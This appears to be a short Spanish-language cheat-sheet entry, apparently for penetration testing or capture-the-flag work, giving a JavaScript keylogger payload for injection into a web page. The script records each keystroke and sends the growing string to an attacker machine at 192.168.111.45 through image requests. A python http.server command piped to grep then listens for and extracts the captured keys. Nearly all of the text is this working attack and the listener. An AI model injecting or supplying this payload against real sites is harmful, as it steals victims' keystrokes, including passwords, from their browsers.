//Este script registra las entradas del teclado de la victima y las envía a la máquina atacante

```js
<script>
	var k = ""
	document.onkeypress = function(e){
		e = e || window.event;
		k += e.key;
		var i = new Image();
		i.src = "http://192.168.111.45/" + k;
	};
</script>
```

*filtrar el output del keylogger*

	python3 -m http.server 80 2>&1 | grep -oP 'GET /\k[^.*\S]+'

Esto se pone a la escucha y filtra el output desde la palabra GET y se queda solo con lo que se introduce en el keylogger eliminando ruido
